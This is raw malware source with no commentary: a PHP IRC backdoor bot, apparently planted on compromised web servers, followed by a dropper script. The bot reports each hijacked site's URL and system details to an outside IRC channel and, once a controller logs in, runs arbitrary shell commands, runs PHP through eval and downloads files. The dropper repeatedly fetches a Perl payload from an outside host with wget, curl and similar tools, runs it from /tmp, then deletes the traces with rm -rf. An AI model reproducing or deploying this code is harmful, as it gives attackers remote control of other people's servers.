tEAmHaCk is now running!

 <? 

set_time_limit(0); 
error_reporting(0); 

class pBot 
{ 
var $config = array("server"=>"parlente.biz.tm", 
                     "port"=>8000, 
                     "pass"=>"",
                     "prefix"=>"kerawuk|", 
                     "maxrand"=>03, 
                     "chan"=>"#teamhack",
			   "chan2"=>"#jombang", 
                     "key"=>"exploit",
                     "modes"=>"+p", 
                     "password"=>"jembut",
                     "trigger"=>".", 
                     "hostauth"=>"*" // * for any hostname (remember: /setvhost camacho.web.id)
                     ); 
 var $users = array(); 
 function start() 
 { 
    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) 
       $this->start(); 
    $ident = "CaMaChO";
    if(strlen($this->config['pass'])>0) 
       $this->send("PASS ".$this->config['pass']); 
    $this->send("USER ".$ident." 127.0.0.1 localhost :4..:7�4:..8 ".php_uname()." 4..:7�4:.."); 
    $this->set_nick(); 
    $this->main(); 
 } 
 function main() 
 { 
    while(!feof($this->conn)) 
    { 
       $this->buf = trim(fgets($this->conn,512)); 
       $cmd = explode(" ",$this->buf); 
       if(substr($this->buf,0,6)=="PING :") 
       { 
          $this->send("PONG :".substr($this->buf,6)); 
       } 
       if(isset($cmd[1]) && $cmd[1] =="001") 
       { 
          $this->send("MODE ".$this->nick." ".$this->config['modes']); 
          $this->join($this->config['chan'],$this->config['key']);
		  $this->privmsg($this->config['chan2'],"[\2vuln!\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");
		  $this->send("MODE ".$this->nick." ".$this->config['modes']); 
          $this->join($this->config['chan'],$this->config['key']);
          if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
          else { $safemode = "off"; }
          $uname = php_uname();
          $this->privmsg($this->config['chan2'],"[\2uname!\2]: $uname (safe: $safemode)");
          $this->privmsg($this->config['chan2'],"[\2vuln!\2]: http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."");
       } 
       if(isset($cmd[1]) && $cmd[1]=="433") 
       { 
          $this->set_nick(); 
       } 
       if($this->buf != $old_buf) 
       { 
          $mcmd = array(); 
          $msg = substr(strstr($this->buf," :"),2); 
          $msgcmd = explode(" ",$msg); 
          $nick = explode("!",$cmd[0]); 
          $vhost = explode("@",$nick[1]); 
          $vhost = $vhost[1]; 
          $nick = substr($nick[0],1); 
          $host = $cmd[0]; 
          if($msgcmd[0]==$this->nick) 
          { 
           for($i=0;$i<count($msgcmd);$i++) 
              $mcmd[$i] = $msgcmd[$i+1]; 
          } 
          else 
          { 
           for($i=0;$i<count($msgcmd);$i++) 
              $mcmd[$i] = $msgcmd[$i]; 
          } 
          if(count($cmd)>2) 
          { 
             switch($cmd[1]) 
             { 
                case "QUIT": 
                   if($this->is_logged_in($host)) 
                   { 
                      $this->log_out($host); 
                   } 
                break; 
                case "PART": 
                   if($this->is_logged_in($host)) 
                   { 
                      $this->log_out($host); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*")) 
                   { 
                      if(substr($mcmd[0],0,1)==".") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         { 
                            case "user": 
                              if($mcmd[1]==$this->config['password']) 
                              { 
                                 $this->privmsg($this->config['chan'],"[\2Auth\2]: 4 Siap 8 Boss $nick"); 
                                 $this->log_in($host); 
                              } 
                              else 
                              { 
                                 $this->privmsg($this->config['chan'],"[\2Auth\2]: 9 Si 8 $nick 4 MaLing....!!"); 
                              } 
                            break; 
                         } 
                      } 
                   } 
                   elseif($this->is_logged_in($host)) 
                   { 
                      if(substr($mcmd[0],0,1)==".") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         { 
                            case "dns": 
                               if(isset($mcmd[1])) 
                               { 
                                  $ip = explode(".",$mcmd[1]); 
                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) 
                                  { 
                                     $this->privmsg($this->config['chan2'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan2'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1])); 
                                  } 
                               } 
                            break; 
                            case "info": 
                               $this->privmsg($this->config['chan2'],"[\2info\2]: [\2httpd\2: ".$_SERVER['SERVER_SOFTWARE']."] [\2docroot\2: ".$_SERVER['DOCUMENT_ROOT']."] [\2domain\2: 

".$_SERVER['SERVER_NAME']."] [\2admin\2: ".$_SERVER['SERVER_ADMIN']."] [\2url\2:".$_SERVER['REQUEST_URI']."]"); 
                            break;
                            case "bot": 
                               $this->privmsg($this->config['chan'],"[\212TeamHack4-8Bot\2]"); 
                            break;
                            case "cmd": 
                               if(isset($mcmd[1])) 
                               { 
                                  $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                                  $this->privmsg($this->config['chan2'],"[\2cmd\2]: $command"); 
                                  $pipe = popen($command,"r"); 
                                  while(!feof($pipe)) 
                                  { 
                                     $pbuf = trim(fgets($pipe,512)); 
                                     if($pbuf != NULL) 
                                        $this->privmsg($this->config['chan2'],"     : $pbuf"); 
                                  } 
                                  pclose($pipe); 
                               } 
                            break; 
                            case "raw": 
                               $this->send(strstr($msg,$mcmd[1])); 
                            break; 
                            case "php": 
                               $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1]))); 
                            break; 
                            case "exec": 
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                               $exec = shell_exec($command); 
                               $ret = explode("\n",$exec); 
                               $this->privmsg($this->config['chan2'],"[\2exec\2]: $command"); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config['chan2'],"      : ".trim($ret[$i])); 
                            break; 
                            case "download": 
                               if(count($mcmd) > 2) 
                               { 
                                  if(!$fp = fopen($mcmd[2],"w")) 
                                  { 
                                     $this->privmsg($this->config['chan2'],"[\2download\2]: Cannot download, permission denied."); 
                                  } 
                                  else 
                                  { 
                                     if(!$get = file($mcmd[1])) 
                                     { 
                                        $this->privmsg($this->config['chan2'],"[\2download\2]: Unable to download from \2".$mcmd[1]."\2"); 
                                     } 
                                     else 
                                     { 
                                        for($i=0;$i<=count($get);$i++) 
                                        { 
                                           fwrite($fp,$get[$i]); 
                                        } 
                                        $this->privmsg($this->config['chan2'],"[\2download\2]: File \2".$mcmd[1]."\2 downloaded to \2".$mcmd[2]."\2"); 
                                     } 
                                     fclose($fp); 
                                  } 
                               } 
                            break; 
                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $old_buf = $this->buf; 
    } 
    $this->start(); 
 } 
 function send($msg) 
 { 
    fwrite($this->conn,"$msg\r\n"); 

 } 
 function join($chan,$key=NULL) 
 { 
    $this->send("JOIN $chan $key"); 
 } 
 function privmsg($to,$msg) 
 { 
    $this->send("PRIVMSG $to :$msg"); 
 } 
 function is_logged_in($host) 
 { 
    if(isset($this->users[$host])) 
       return 1; 
    else 
       return 0; 
 } 
 function log_in($host) 
 { 
    $this->users[$host] = true; 
 } 
 function log_out($host) 
 { 
    unset($this->users[$host]); 
 } 
 function set_nick() 
 { 
    if(isset($_SERVER['SERVER_SOFTWARE'])) 
    { 
       if(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"apache")) 
          $this->nick = ""; 
       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"iis")) 
          $this->nick = ""; 
       elseif(strstr(strtolower($_SERVER['SERVER_SOFTWARE']),"xitami")) 
          $this->nick = "[Crew]"; 
       else 
          $this->nick = "[TeamHack]"; 
    } 
    else 
    { 
       $this->nick = "[XxX]"; 
    } 
    $this->nick .= $this->config['prefix']; 
    for($i=0;$i<$this->config['maxrand'];$i++) 
       $this->nick .= mt_rand(0,9); 
    $this->send("NICK ".$this->nick); 
 }  
} 

$bot = new pBot; 
$bot->start(); 

?>

shell bot running
<?
shell_exec("cd /tmp; wget http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*");
shell_exec('cd /tmp; wget http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
shell_exec('cd /tmp;curl -O http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
shell_exec('cd /tmp;lwp-download http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
shell_exec('cd /tmp;lynx -source http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
shell_exec('cd /tmp;fetch http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
shell_exec('cd /tmp;GET http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
shell_exec('rm -rf ccok.xpp');
shell_exec('rm -rf *.xpp');
shell_exec('rm -rf ccok.xpp*');
shell_exec('rm -rf *.xpp.*');
shell_exec('rm -rf /tmp/*');
shell_exec('rm -rf /tmp/*.xpp');
shell_exec('rm -rf /tmp/*.xpp');
shell_exec('rm -rf /tmp/*.xpp.*');
passthru('rm -rf ccok.xpp');
passthru('rm -rf *.xpp');
passthru('rm -rf ccok.xpp*');
passthru('rm -rf *.xpp.*');
passthru("cd /tmp; wget http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*");
passthru('cd /tmp; wget http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
passthru('cd /tmp;curl -O http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
passthru('cd /tmp;lwp-download http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
passthru('cd /tmp;lynx -source http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
passthru('cd /tmp;fetch http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
passthru('cd /tmp;GET http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
passthru('rm -rf ccok.xpp');
passthru('rm -rf *.xpp');
passthru('rm -rf ccok.xpp*');
passthru('rm -rf *.xpp.*');
shell_exec('rm -rf /tmp/*');
shell_exec('rm -rf /tmp/*.xpp');
shell_exec('rm -rf /tmp/*.xpp');
shell_exec('rm -rf /tmp/*.xpp.*');
exec("cd /tmp; wget http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*");
exec('cd /tmp; wget http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
exec('cd /tmp;curl -O http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
exec('cd /tmp;lwp-download http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
exec('cd /tmp;lynx -source http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
exec('cd /tmp;fetch http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
exec('cd /tmp;GET http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
exec('rm -rf ccok.xpp');
exec('rm -rf *.xpp');
exec('rm -rf ccok.xpp*');
exec('rm -rf *.xpp.*');
shell_exec('rm -rf /tmp/*');
shell_exec('rm -rf /tmp/*.xpp');
shell_exec('rm -rf /tmp/*.xpp');
shell_exec('rm -rf /tmp/*.xpp.*');
passthru('rm -rf ccok.xpp');
passthru('rm -rf *.xpp');
passthru('rm -rf ccok.xpp*');
passthru('rm -rf *.xpp.*');
exec("cd /tmp; wget http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*");
exec('cd /tmp; wget http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
exec('cd /tmp;curl -O http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
exec('cd /tmp;lwp-download http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
exec('cd /tmp;lynx -source http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
exec('cd /tmp;fetch http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
exec('cd /tmp;GET http://www.ribarska.com/cgi-bin/article/ccok.xpp;perl ccok.xpp;perl ccok.xpp.*');
system('rm -rf ccok.xpp');
system('rm -rf *.xpp');
system('rm -rf ccok.xpp*');
system('rm -rf *.xpp.*');
shell_exec('rm -rf /tmp/*');
shell_exec('rm -rf /tmp/*.xpp');
shell_exec('rm -rf /tmp/*.xpp');
shell_exec('rm -rf /tmp/*.xpp.*');
passthru('rm -rf ccok.xpp');
passthru('rm -rf *.xpp');
passthru('rm -rf ccok.xpp*');
passthru('rm -rf *.xpp.*');
?>